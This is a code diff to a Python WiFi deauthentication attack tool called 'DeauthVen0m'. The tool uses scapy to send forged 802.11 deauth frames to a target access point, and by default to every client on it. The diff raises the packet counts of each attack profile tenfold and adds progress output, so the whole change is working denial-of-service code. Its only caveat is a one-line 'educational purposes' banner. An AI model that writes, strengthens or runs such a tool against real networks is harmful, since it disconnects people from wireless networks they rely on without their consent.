@@ -12,7 +12,7 @@ init(autoreset=True)
 def show_banner():
     banner = pyfiglet.figlet_format("DeauthVen0m", font="slant")
     print(f"{Fore.RED}{banner}")
-    print(f"{Fore.CYAN}Advanced WiFi Deauth Attack Tool by DeauthVen0m\n")
+    print(f"{Fore.CYAN}WiFi Deauth Attack Tool by root0emir\n")
     print(f"{Fore.YELLOW}Use responsibly. This tool is for educational purposes only.\n")
 
 
@@ -96,9 +96,15 @@ def deauth_attack(target_bssid, client_bssid="FF:FF:FF:FF:FF:FF"):
     dot11 = Dot11(addr1=client_bssid, addr2=target_bssid, addr3=target_bssid)
     packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
     print(f"{Fore.RED}[*] Launching deauth attack on {target_bssid} -> {client_bssid}...")
+
     for i in range(0, deauth_packets, burst):
         sendp(packet, inter=interval, count=burst, iface=interface, verbose=0)
+        
+        if (i // burst + 1) % 100 == 0:
+            print(f"{Fore.YELLOW}[+] Sent {(i // burst + 1) * burst} deauth packets so far...")
+        
         time.sleep(1)
+    
     print(f"{Fore.GREEN}[+] Deauth attack complete.")
 
 
@@ -121,17 +127,17 @@ def select_attack_profile():
     choice = input("Choose an attack profile: ")
     if choice == "1":
         scan_time = 20
-        deauth_packets = 500
+        deauth_packets = 5000
         interval = 0.1
         burst = 5
     elif choice == "2":
         scan_time = 15
-        deauth_packets = 750
+        deauth_packets = 7500
         interval = 0.1
         burst = 10
     elif choice == "3":
         scan_time = 10
-        deauth_packets = 1000
+        deauth_packets = 10000
         interval = 0.01
         burst = 50
     else:
